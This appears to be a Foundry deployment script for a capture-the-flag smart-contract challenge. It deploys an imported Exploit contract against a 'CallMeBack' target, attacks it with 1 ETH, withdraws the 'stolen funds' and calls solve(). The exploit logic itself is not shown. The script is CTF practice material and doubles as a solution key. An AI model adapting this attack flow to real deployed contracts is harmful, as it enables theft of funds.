// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Exploit.sol";

contract SolveScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address callMeBack = vm.envAddress("CALLMEBACK");
        address challenge = vm.envAddress("CHALLENGE");
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Deploy exploit
        Exploit exploit = new Exploit(callMeBack);
        console.log("Exploit deployed at:", address(exploit));
        
        // Attack with 1 ETH
        exploit.attack{value: 1 ether}();
        console.log("Attack executed");
        
        // Withdraw stolen funds
        exploit.withdraw();
        console.log("Funds withdrawn to player");
        
        // Call solve
        (bool success,) = challenge.call(abi.encodeWithSignature("solve()"));
        require(success, "Solve failed");
        console.log("Challenge solved!");
        
        vm.stopBroadcast();
    }
}